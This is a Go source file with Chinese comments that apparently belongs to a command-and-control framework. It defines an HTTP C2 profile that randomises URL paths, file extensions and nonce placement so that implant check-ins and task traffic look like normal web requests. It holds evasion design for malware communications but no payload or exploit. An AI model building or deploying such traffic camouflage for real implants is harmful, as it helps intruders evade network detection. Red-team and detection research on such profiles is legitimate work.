package protocol

// NonceMode 决定 nonce 嵌入 URL 的位置。
// Server 端据此知道从哪里提取 nonce，Implant 端据此决定如何嵌入。
const (
	NonceModeURLParam = "urlparam" // nonce 作为查询参数 ?_=xxx（默认，更像正常流量）
	NonceModeURL      = "url"      // nonce 作为路径的一段 /xxx/api/...
)

// 每种 C2 消息类型固定映射到一个文件扩展名。
const (
	ExtRegister   = ".php"  // 注册
	ExtCheckin    = ".js"   // 心跳 / 任务下发
	ExtTaskResult = ".html" // 任务结果回传（预留）
)

// HTTPC2PathSegment 表示 C2 Profile 中的一个路径片段。
// IsFile=true 表示这是一个文件名（不含扩展名），false 表示是目录段。
type HTTPC2PathSegment struct {
	Value  string `json:"value"`
	IsFile bool   `json:"is_file"`
}

// C2Profile 描述 HTTP C2 的随机化行为。
// 这份配置在 Server 端定义，通过模板渲染 bake 进 Implant 二进制。
type C2Profile struct {
	// PathSegments 是路径片段的候选池。每个片段标记为目录或文件。
	// 目录段示例: "api", "assets", "static", "v1"
	// 文件段示例: "chunk", "bundle", "app", "index"
	PathSegments []HTTPC2PathSegment `json:"path_segments"`
	
	// Extensions 是文件扩展名的候选池。空字符串表示无扩展名。
	// 示例: ["js", "php", "html", ""]
	Extensions []string `json:"extensions"`
	
	// MinPathLength / MaxPathLength 控制每次请求生成的目录段数量范围。
	// 实际值在 [MinPathLength, MaxPathLength] 内随机。
	MinPathLength int `json:"min_path_length"`
	MaxPathLength int `json:"max_path_length"`
	
	// NonceMode 决定 nonce 放在 URL 路径中还是查询参数中。
	NonceMode string `json:"nonce_mode"`
	
	// EncoderModulus 是 nonce 取模运算的模数。
	// nonce % EncoderModulus = EncoderID，Server 据此选择解码器。
	// 必须大于 encoder 的数量，建议取一个较大的质数。
	EncoderModulus int `json:"encoder_modulus"`
}

// DefaultC2Profile 返回一份可用于开发的默认 C2 Profile。
func DefaultC2Profile() *C2Profile {
	return &C2Profile{
		PathSegments: []HTTPC2PathSegment{
			{Value: "api", IsFile: false},
			{Value: "assets", IsFile: false},
			{Value: "static", IsFile: false},
			{Value: "v1", IsFile: false},
			{Value: "chunk", IsFile: true},
			{Value: "bundle", IsFile: true},
			{Value: "app", IsFile: true},
			{Value: "index", IsFile: true},
		},
		Extensions:     []string{"js", "php", "html", ""},
		MinPathLength:  1,
		MaxPathLength:  3,
		NonceMode:      NonceModeURLParam,
		EncoderModulus: 256,
	}
}
